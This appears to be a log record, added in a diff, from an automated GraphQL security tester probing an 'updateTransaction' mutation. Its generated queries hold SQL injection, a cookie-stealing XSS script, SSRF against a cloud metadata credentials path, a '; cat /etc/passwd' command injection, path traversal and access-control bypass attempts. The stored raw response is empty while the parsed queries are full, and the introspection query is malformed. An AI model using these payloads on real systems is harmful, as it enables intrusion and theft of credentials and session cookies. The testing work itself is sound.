@@ -1,0 +1,56 @@
+{
+  "timestamp": "20251008_115921",
+  "endpoint": "updateTransaction",
+  "prompt": "\n    You are an expert in GraphQL API security testing.\n\n    Goal: generate valid GraphQL queries for the operation shown, to get successful responses (HTTP 200) quickly while exploring robustness and testing for specific vulnerability types.\n\n    \n    CRITICAL REQUIREMENT: You MUST include at least one query for a basic call and EACH of the following vulnerability types:\n    - SQL Injection\n    - XSS Injection\n    - SSRF Injection\n    - OS Command Injection\n    - Path Injection\n    - HTML Injection\n    - Query Deny Bypass (REQUIRES TWO QUERIES: non-aliased and aliased)\n    - Introspection\n    - Field Suggestions\n\n    Strict Requirements:\n    1) Queries must be syntactically valid GraphQL.\n    2) No placeholders like <id>, \"ID!\", \"value\". Use realistic literals or known real values.\n    3) You may attempt injected strings, nulls, overlong strings, and type mismatches where appropriate.\n    4) You may output 1 query(ies) but MUST cover all vulnerability types listed above.\n    5) Do not use the words \"edges\" or \"node\".\n    6) GraphQL is case-sensitive. Match the exact operation name: updateTransaction.\n    7) For each vulnerability type, craft queries that specifically test for that vulnerability pattern.\n    8) CRITICAL: Label each query with its vulnerability type using the format: ***<vulnerability_type>*** before each ```graphql block.\n    9) SPECIAL CASE: For Query Deny Bypass, you MUST generate TWO queries:\n        - First query: Non-aliased version (normal query structure)\n        - Second query: Aliased version (using query aliases like \"s: queryName\")\n        Both queries should test the same operation but with different structures to test access control bypass.\n    \n        Schema not provided: explore plausibly.\n        - Prefer fields/args seen in prior successful responses or known real values.\n        - Introduce at most 1–2 new fields per query.\n        - Keep selection depth minimal to maximize validity.\n        \n    Context:\n    - operation: updateTransaction\n    - input (declared): updateTransaction, input: {'transactionID': 'ID!', 'amount': 'Float', 'payer': 'ID', 'description': 'String'}\n    - node type: mutation\n    - known real values: \n    \n    Argument strategy: synthesize realistic literals by type (e.g., ISO dates, small integers, emails, UUIDv4), avoid placeholders.\n    Selection depth target: 1. Keep nested selections no deeper than 1 levels.\n    \n    Output format:\n    Each query must be in its own fenced block with a vulnerability type label:\n    Vulnerability Type Labels Are:\n    - SQL_Injection\n    - XSS_Injection\n    - SSRF_Injection\n    - OS_Command_Injection\n    - Path_Injection\n    - HTML_Injection\n    - Query_Deny_Bypass_Non_Aliased\n    - Query_Deny_Bypass_Aliased\n    - Introspection\n    - Field_Suggestions\n    - Basic_Call\n\n    ***<Vulnerability Type>***\n    ```graphql\n    <your query>\n    ```\n    \n    Example:\n    ***SQL_Injection***\n    ```graphql\n    query {\n      users(filter: \"1' OR '1'='1\") {\n        id\n        name\n      }\n    }\n    ```\n    \n    ***XSS_Injection***\n    ```graphql\n    query {\n      search(term: \"<script>alert('xss')</script>\") {\n        results\n      }\n    }\n    ```\n    ",
+  "llm_response": "```",
+  "parsed_queries": {
+    "query": [
+      {
+        "query": "\nmutation {\n  updateTransaction(input: {transactionID: \"3fa85f64-5717-4562-b3fc-2c963f66afa6\", amount: 99.95, payer: \"550e8400-e29b-41d4-a716-446655440000\", description: \"Monthly subscription\"}) {\n    id\n    amount\n    payer\n    description\n    updatedAt\n  }\n}\n",
+        "vulnerability_type": "basic_call"
+      },
+      {
+        "query": "\nmutation {\n  updateTransaction(input: {transactionID: \"3fa85f64-5717-4562-b3fc-2c963f66afa6' OR '1'='1\", amount: 0.01, payer: \"550e8400-e29b-41d4-a716-446655440000\", description: \"SQLi test payload\"}) {\n    id\n    amount\n    payer\n    description\n  }\n}\n",
+        "vulnerability_type": "sql_injection"
+      },
+      {
+        "query": "\nmutation {\n  updateTransaction(input: {transactionID: \"4c4b147e-9bcb-4e1a-a5c0-0c2f8e8b7b9a\", amount: 12.34, payer: \"9a7b6c5d-0011-2233-4455-66778899aabb\", description: \"<script>fetch('/steal?c='+document.cookie)</script>\"}) {\n    id\n    description\n  }\n}\n",
+        "vulnerability_type": "xss_injection"
+      },
+      {
+        "query": "\nmutation {\n  updateTransaction(input: {transactionID: \"a1b2c3d4-e5f6-7890-abcd-ef0123456789\", amount: 1.00, payer: \"550e8400-e29b-41d4-a716-446655440000\", description: \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"}) {\n    id\n    description\n    status\n  }\n}\n",
+        "vulnerability_type": "ssrf_injection"
+      },
+      {
+        "query": "\nmutation {\n  updateTransaction(input: {transactionID: \"c9bf9e57-1685-4c89-bafb-ff5af830be8a\", amount: 0.00, payer: \"550e8400-e29b-41d4-a716-446655440000\", description: \"; cat /etc/passwd || true\"}) {\n    id\n    description\n  }\n}\n",
+        "vulnerability_type": "os_command_injection"
+      },
+      {
+        "query": "\nmutation {\n  updateTransaction(input: {transactionID: \"../../../../etc/passwd\", amount: 0.00, payer: \"550e8400-e29b-41d4-a716-446655440000\", description: \"../config/secrets.yml\"}) {\n    id\n    description\n  }\n}\n",
+        "vulnerability_type": "path_injection"
+      },
+      {
+        "query": "\nmutation {\n  updateTransaction(input: {transactionID: \"d2719f5e-1f53-4a2a-9f3b-0a1f3b9e2a3c\", amount: 5.50, payer: \"user-admin-0001\", description: \"<div onclick=\\\"alert('pwned')\\\">Pay</div>\"}) {\n    id\n    description\n  }\n}\n",
+        "vulnerability_type": "html_injection"
+      },
+      {
+        "query": "\nmutation {\n  updateTransaction(input: {transactionID: \"11111111-2222-3333-4444-555555555555\", amount: 0.01, payer: \"admin-0001\", description: \"Attempt update of admin-owned transaction\"}) {\n    id\n    payer\n    amount\n  }\n}\n",
+        "vulnerability_type": "query_deny_bypass_non_aliased"
+      },
+      {
+        "query": "\nmutation {\n  s: updateTransaction(input: {transactionID: \"11111111-2222-3333-4444-555555555555\", amount: 0.01, payer: \"admin-0001\", description: \"Attempt update of admin-owned transaction (aliased)\"}) {\n    id\n    payer\n    amount\n  }\n}\n",
+        "vulnerability_type": "query_deny_bypass_aliased"
+      },
+      {
+        "query": "\n# Introspection query included alongside a mutation to probe schema disclosure.\nquery IntrospectSchema {\n  updateTransaction {\n    types {\n      name\n    }\n  }\n}\n\nmutation {\n  updateTransaction(input: {transactionID: \"9f14f7a4-1234-4b6f-9a1b-0a1b2c3d4e5f\", amount: 7.77, payer: \"user-1234\", description: \"Introspection probe\"}) {\n    id\n    __typename\n    amount\n  }\n}\n",
+        "vulnerability_type": "introspection"
+      },
+      {
+        "query": "\nmutation {\n  updateTransaction(input: {transactionID: \"2b6f1f4a-8bf6-4a3b-9a2c-7e8a9b0c1d2e\", amount: 45.00, payer: \"user-9876\", description: \"Check misspelled fields for suggestions\"}) {\n    id\n    descripton\n    ammount\n  }\n}\n",
+        "vulnerability_type": "field_suggestions"
+      }
+    ]
+  },
+  "approx_tokens": 796.75,
+  "request_time": "2025-10-08T11:59:21.913594"
+}
